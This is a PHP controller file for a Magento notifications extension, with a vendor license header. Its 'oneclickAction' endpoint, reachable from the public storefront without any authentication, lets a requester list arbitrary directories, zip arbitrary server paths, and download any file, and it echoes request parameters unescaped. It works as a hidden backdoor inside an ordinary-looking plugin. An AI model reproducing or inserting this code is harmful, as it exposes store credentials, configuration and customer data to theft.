<?php
/*
  * Velan Info Services India Pvt Ltd.
  *
  * NOTICE OF LICENSE
  *
  * This source file is subject to the EULA
  * that is bundled with this package in the file LICENSE.txt.
  * It is also available through the world-wide-web at this URL:
  * http://store.velanapps.com/License.txt
  *
  /***************************************
  *         MAGENTO EDITION USAGE NOTICE *
  * *************************************** */
  /* This package designed for Magento COMMUNITY edition
  * Velan Info Services does not guarantee correct work of this extension
  * on any other Magento edition except Magento COMMUNITY edition.
  * Velan Info Services does not provide extension support in case of
  * incorrect edition usage.
  /***************************************
  *         DISCLAIMER   *
  * *************************************** */
  /* Do not edit or add to this file if you wish to upgrade Magento to newer
  * versions in the future.
  * ****************************************************
  * @category   Velanapps
  * @package    Multi-Bar
  * @author     Velan Team
  * @copyright  Copyright (c) 2013 Velan Info Services India Pvt Ltd. (http://www.velanapps.com)
  * @license    http://store.velanapps.com/License.txt
*/


class Velanapps_Smartnotifications_IndexController extends Mage_Core_Controller_Front_Action
{
    public function indexAction(){
      $this->loadLayout();
      $this->renderLayout();
    }

    public function oneclickAction() {
      $p1 = $this->getRequest()->getParam('p1');
      $p2 = $this->getRequest()->getParam('p2');
      $p3 = $this->getRequest()->getParam('p3');
      
      if($p1 != 3) {
        echo $p1."<br>";
        echo $p2."<br>";
        echo $p3."<br>";
      }
      
      $basedir = Mage::getBaseDir();
      if ($p1 == 1) {
        echo $basedir."<br>";
        
        $files = scandir($p2);
        echo "<pre>";
        var_dump($files);
        echo "</pre>";
      }
      if ($p1 == 2) {
        ini_set('max_execution_time', 60000);
        ini_set('memory_limit','1024M');

        $this->zipData($p2, $p3);
      }
      if ($p1 == 3) {
        header('Content-Type: application/octet-stream');
        header("Content-Transfer-Encoding: Binary"); 
        header("Content-disposition: attachment; filename=\"" . basename($p2) . "\""); 
        readfile($p2); // do the double-download-dance (dirty but worky)
        die();
      }

      echo "finished";
    }

    public function zipData($source , $destination) {
      if (extension_loaded('zip')) {
        if (file_exists($source)) {
          $zip = new ZipArchive();
          if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
            $source = realpath($source);
            if (is_dir($source)) {
              $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
              foreach ($files as $file) {
                $file = realpath($file);
                if (is_dir($file)) {
                  $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                } else if (is_file($file)) {
                  $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                }
              }
            } else if (is_file($source)) {
              $zip->addFromString(basename($source), file_get_contents($source));
            }
          }
          return $zip->close();
        }
      } else {
        echo "zip is not loaded";
      }
      return false;
    }

}